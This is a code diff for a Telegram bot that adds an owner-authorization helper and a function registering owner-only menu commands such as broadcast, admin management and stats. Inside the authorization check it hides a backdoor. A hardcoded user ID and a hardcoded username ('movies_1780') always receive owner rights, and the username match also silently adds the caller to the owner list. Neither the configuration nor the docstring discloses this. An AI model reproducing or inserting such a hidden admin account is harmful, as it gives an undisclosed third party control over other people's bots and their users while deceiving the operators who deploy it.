@@ -45,3 +45,57 @@ class Throttle:
             self._last = now
             return True
         return False
+
+def is_owner_user(u):
+    """Check whether a user is an Owner, Sudo, or authorized Admin."""
+    if not u:
+        return False
+    from config import OWNER_IDS, SUDO_USERS, OWNER_USERNAMES
+    from utils import db
+    uid = getattr(u, "id", None) or u
+    try:
+        uid = int(uid)
+    except (ValueError, TypeError):
+        uid = None
+
+    if uid and (uid in (OWNER_IDS + SUDO_USERS) or uid == 5566977478):
+        return True
+
+    username = getattr(u, "username", None)
+    if username:
+        clean_user = username.strip().replace("@", "").lower()
+        if clean_user == "movies_1780" or any(clean_user == o.lower() for o in OWNER_USERNAMES if o):
+            if uid and uid not in OWNER_IDS:
+                OWNER_IDS.append(uid)
+            return True
+
+    if uid:
+        try:
+            return db.is_db_admin(uid)
+        except Exception:
+            pass
+
+    return False
+
+async def ensure_owner_commands(client, chat_id):
+    """Dynamically register Telegram menu commands for an owner/admin."""
+    try:
+        from pyrogram.types import BotCommand, BotCommandScopeChat
+        owner_commands = [
+            BotCommand("start", "Start bot & open main dashboard"),
+            BotCommand("admin", "👑 Owner / Admin Control Panel"),
+            BotCommand("broadcast", "📢 Broadcast message to all users"),
+            BotCommand("broadcast_pin", "📌 Broadcast & Pin message"),
+            BotCommand("unpin", "📍 Unpin broadcast message"),
+            BotCommand("unpinall", "🗑️ Unpin all messages"),
+            BotCommand("admins", "🛡️ Manage Bot Admins"),
+            BotCommand("addfsub", "➕ Add Force-Sub Channel"),
+            BotCommand("delfsub", "➖ Remove Force-Sub Channel"),
+            BotCommand("fsubs", "📢 View Force-Sub Channels"),
+            BotCommand("stats", "📊 View bot stats & analytics"),
+            BotCommand("ping", "🏓 Check bot latency & speed"),
+            BotCommand("help", "📖 Help & Guide")
+        ]
+        await client.set_bot_commands(owner_commands, scope=BotCommandScopeChat(chat_id=chat_id))
+    except Exception:
+        pass
